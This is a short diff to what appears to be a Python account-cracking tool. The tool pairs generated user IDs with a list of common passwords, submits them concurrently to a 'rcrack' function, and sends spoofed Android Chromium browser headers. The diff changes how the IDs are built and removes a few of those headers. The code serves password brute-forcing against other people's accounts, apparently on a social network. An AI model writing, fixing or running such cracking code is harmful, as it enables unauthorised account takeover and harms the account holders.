@@ -220,7 +220,7 @@ def i():
         print('\033[38;5;46--------------------------------------------')
         for love in user:
             pwx = [love,'bangladesh','i love you','00009999','203040','123321','121234','889900','708090','Bangladesh','0987654','258036','258025']
-            uid = code+love
+            uid = uid+love
             Riyad.submit(rcrack,uid,pwx,tl)
     print('\n    CRACK PROCESS HAS BEEN COMPLETED ')
  
@@ -251,12 +251,9 @@ def rcrack(uid,pwx,tl):
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
-            'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"11.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
